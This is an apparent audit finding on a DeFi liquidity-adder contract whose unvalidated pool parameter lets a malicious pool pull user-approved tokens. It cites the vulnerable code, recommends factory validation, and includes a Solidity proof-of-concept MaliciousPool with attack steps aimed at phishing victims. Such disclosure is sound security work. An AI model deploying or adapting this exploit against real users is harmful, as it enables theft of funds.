### Title
Caller-Controlled `pool` Address in `MetricOmmPoolLiquidityAdder` Allows Malicious Pool to Drain User-Approved Tokens - (File: metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol)

### Summary
`MetricOmmPoolLiquidityAdder` accepts an arbitrary `pool` address from the caller and stores it as the trusted callback counterparty in transient storage. Because the pool is never validated against the factory, a malicious pool contract can pass the `msg.sender == expectedPool` check in `metricOmmModifyLiquidityCallback`, return attacker-chosen token addresses from `getImmutables()`, and cause the adder to pull up to `maxAmountToken0`/`maxAmountToken1` of any ERC-20 from the victim's wallet.

### Finding Description

`addLiquidityExactShares` and `addLiquidityWeighted` both accept a caller-supplied `pool` address and immediately store it as the authoritative callback pool via `_setPayContext`: [1](#0-0) 

The transient-storage guard in `metricOmmModifyLiquidityCallback` only checks that `msg.sender` equals the stored pool address: [2](#0-1) 

Because the stored address was set to the malicious pool by the caller, this check is trivially satisfied. The callback then queries `IMetricOmmPool(msg.sender).getImmutables()` to learn which tokens to pull: [3](#0-2) 

A malicious pool controls both the return value of `getImmutables()` (choosing any token addresses) and the `amount0Delta`/`amount1Delta` values it passes into the callback (up to the user-supplied caps). The NatSpec on the contract explicitly acknowledges this gap but does not fix it: [4](#0-3) 

### Impact Explanation

Any user who has granted a token approval to `MetricOmmPoolLiquidityAdder` can have up to `maxAmountToken0` of token0 and `maxAmountToken1` of token1 stolen in a single transaction. The attacker deploys a malicious pool, tricks the victim into calling `addLiquidityExactShares(maliciousPool, ...)` (e.g., via a phishing front-end or a malicious integration), and the malicious pool's `addLiquidity` re-enters `metricOmmModifyLiquidityCallback` with `amount0Delta = maxAmountToken0`, `amount1Delta = maxAmountToken1`, and `getImmutables()` returning the victim's approved tokens. The `pay` call then executes `transferFrom(victim, maliciousPool, amount)` for both tokens. This is a direct loss of user principal.

### Likelihood Explanation

The trigger requires no privileged role — any unprivileged caller can supply an arbitrary `pool` address. The only precondition is that the victim has approved the adder (standard UX for any liquidity deposit flow) and is induced to call with a malicious pool address. This is a realistic phishing or integration-poisoning scenario, making likelihood Medium.

### Recommendation

Validate the `pool` parameter against the `MetricOmmPoolFactory` before storing it in transient context, analogous to how `MetricOmmSwapRouterBase` validates pools via `_requireExpectedCallbackCaller`. Concretely:

1. Store the factory address in the constructor (as `MetricOmmSimpleRouter` already does via `MetricOmmSwapRouterBase`).
2. In `_addLiquidity` (and the probe path in `addLiquidityWeighted`), call `factory.isPool(pool)` and revert if false, before calling `_setPayContext`. [5](#0-4) 

### Proof of Concept

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {IMetricOmmPoolLiquidityAdder} from ".../IMetricOmmPoolLiquidityAdder.sol";
import {LiquidityDelta} from "@metric-core/types/PoolOperation.sol";
import {PoolImmutables} from "@metric-core/interfaces/IMetricOmmPool/IMetricOmmPool.sol";

contract MaliciousPool {
    address immutable adder;
    address immutable victimToken0;
    address immutable victimToken1;
    address immutable attacker;

    constructor(address _adder, address _t0, address _t1, address _atk) {
        adder = _adder; victimToken0 = _t0; victimToken1 = _t1; attacker = _atk;
    }

    // Called by LiquidityAdder._addLiquidity
    function addLiquidity(address, uint80, LiquidityDelta calldata, bytes calldata, bytes calldata)
        external returns (uint256, uint256)
    {
        // Re-enter the adder callback, claiming max amounts
        IMetricOmmPoolLiquidityAdder(adder).metricOmmModifyLiquidityCallback(
            MAX_STEAL_0, MAX_STEAL_1, abi.encode(uint8(1)) // KIND_PAY
        );
        return (MAX_STEAL_0, MAX_STEAL_1);
    }

    // Adder reads token addresses from here
    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = victimToken0;
        imm.token1 = victimToken1;
    }
}

// Attack:
// 1. Deploy MaliciousPool(adderAddress, USDC, WETH, attackerAddress)
// 2. Victim calls adder.addLiquidityExactShares(maliciousPool, victim, 0, deltas,
//      victimUSDCBalance, victimWETHBalance, "")
// 3. Adder stores maliciousPool as expectedPool, calls maliciousPool.addLiquidity()
// 4. MaliciousPool calls back metricOmmModifyLiquidityCallback — msg.sender == expectedPool ✓
// 5. Adder pulls victimUSDCBalance USDC and victimWETHBalance WETH from victim → maliciousPool
```

The root cause is identical to the `UniProxy.depositSwap` `_router` injection: a caller-supplied address is stored as a trusted counterparty without factory validation, allowing it to pass the callback authentication check and redirect token pulls. [6](#0-5) [7](#0-6)

### Citations

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L19-21)
```text
/// @dev The caller is responsible for supplying a legitimate pool address and other non-malicious parameters.
///      This contract does not verify the pool against the factory; a malicious pool can request token pulls up to
///      the caller-provided max caps during callback settlement.
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L56-68)
```text
  function addLiquidityExactShares(
    address pool,
    address owner,
    uint80 salt,
    LiquidityDelta calldata deltas,
    uint256 maxAmountToken0,
    uint256 maxAmountToken1,
    bytes calldata extensionData
  ) external payable override returns (uint256 amount0Added, uint256 amount1Added) {
    _validateOwner(owner);
    _validateDeltas(deltas);
    return _addLiquidity(pool, owner, salt, deltas, msg.sender, maxAmountToken0, maxAmountToken1, extensionData);
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L162-164)
```text
    (address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
    if (expectedPool == address(0)) revert CallbackContextNotActive();
    if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L169-177)
```text
    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    address token0 = imm.token0;
    address token1 = imm.token1;
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L183-196)
```text
  function _addLiquidity(
    address pool,
    address positionOwner,
    uint80 salt,
    LiquidityDelta memory deltas,
    address payer,
    uint256 maxAmountToken0,
    uint256 maxAmountToken1,
    bytes calldata extensionData
  ) internal returns (uint256 amount0Added, uint256 amount1Added) {
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    try IMetricOmmPoolActions(pool)
      .addLiquidity(positionOwner, salt, deltas, abi.encode(KIND_PAY), extensionData) returns (
      uint256 a0, uint256 a1
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L290-296)
```text
  function _setPayContext(address pool, address payer, uint256 maxAmountToken0, uint256 maxAmountToken1) internal {
    if (_tloadAddress(T_SLOT_PAY_POOL) != address(0)) revert PayContextAlreadyActive();
    _tstoreAddress(T_SLOT_PAY_POOL, pool);
    _tstoreAddress(T_SLOT_PAY_PAYER, payer);
    _tstore(T_SLOT_PAY_MAX0, maxAmountToken0);
    _tstore(T_SLOT_PAY_MAX1, maxAmountToken1);
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L24-24)
```text
  constructor(address weth, address factory) MetricOmmSwapRouterBase(factory) PeripheryPayments(weth) {}
```
